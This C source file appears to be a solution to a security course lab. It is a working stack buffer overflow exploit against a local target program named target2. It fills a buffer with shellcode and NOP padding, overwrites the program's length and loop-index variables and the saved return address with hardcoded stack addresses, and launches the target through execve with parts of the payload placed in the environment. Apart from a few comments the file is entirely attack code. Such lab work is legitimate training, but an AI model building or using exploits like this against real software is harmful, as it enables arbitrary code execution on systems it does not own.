#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"
int rip_addr = 0x2021fe98;
int i_addr = 0x2021fe8c;
int len_addr = 0x2021fe88;
int buf_addr = 0x2021fd80;
char buf_addr_str[] = "\x80\xfd\x21\x20";

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
    char *args[3];
    char *env[12];

    args[0] = TARGET;

    int str_len = rip_addr - buf_addr + 4;
    char exploit_str[str_len];
    memset(exploit_str, 0, str_len);

    strcpy(exploit_str, shellcode);
    int pos = strlen(shellcode);
    while(pos < len_addr - buf_addr) {
        strcat(exploit_str, NOP);
        ++pos;
    }
    // overwrite len to 283
    exploit_str[pos] = '\x1b';
    exploit_str[pos + 1] = '\x01';


    // skip i from 268 to 279
    int i_pos = i_addr - buf_addr;
    exploit_str[i_pos] = '\x17';
    exploit_str[i_pos + 1] = '\x01';

    int rip_pos = rip_addr - buf_addr;
    strcpy(exploit_str + rip_addr - buf_addr, buf_addr_str);

    args[1] = exploit_str;
    args[2] = NULL;
    env[0] = "\0";
    env[1] = &exploit_str[i_pos];
    for(int i = 2; i <= 10; ++i) env[i] = "\0"; // padding 0x0 from 0xfe90 to 0xfe97
    env[11] = &exploit_str[rip_pos];
    if (execve (TARGET, args, env) < 0)
        fprintf (stderr, "execve failed.\n");

    return (0);
}
